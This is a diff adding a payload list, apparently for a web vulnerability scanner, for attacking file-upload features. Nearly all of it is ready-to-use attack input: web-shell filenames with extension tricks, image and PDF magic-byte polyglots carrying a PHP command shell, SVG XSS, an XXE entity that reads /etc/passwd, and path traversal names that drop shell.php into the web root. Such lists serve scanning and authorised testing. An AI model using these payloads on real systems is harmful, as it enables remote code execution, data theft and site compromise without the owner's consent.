@@ -1,0 +1,42 @@
+# File Upload Payloads — cyberm4fia-scanner
+# Categories: Extension Bypass, Content-Type, Magic Bytes, SVG XSS, Path Traversal
+
+# ─── Extension Bypass ───
+shell.php
+shell.phtml
+shell.php5
+shell.pHp
+shell.php.jpg
+shell.jpg.php
+shell.php%00.jpg
+shell.php;.jpg
+shell.php.
+shell.php::$DATA
+shell.asp
+shell.aspx
+shell.jsp
+shell.jspx
+shell.phar
+
+# ─── Content-Type Bypass ───
+Content-Type: image/png (with PHP content)
+Content-Type: image/jpeg (with PHP content)
+Content-Type: image/gif (with PHP content)
+Content-Type: application/octet-stream (with PHP content)
+
+# ─── Magic Bytes ───
+GIF89a<?php system($_GET['c']); ?>
+\xff\xd8\xff\xe0<?php system($_GET['c']); ?>
+%PDF-1.4<?php system($_GET['c']); ?>
+
+# ─── SVG XSS ───
+<svg onload="alert(1)">
+<?xml version="1.0" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+# ─── SVG XXE/SSRF ───
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
+
+# ─── Filename Path Traversal ───
+../../../etc/passwd.png
+../../../../var/www/html/shell.php
+..\..\..\windows\win.ini
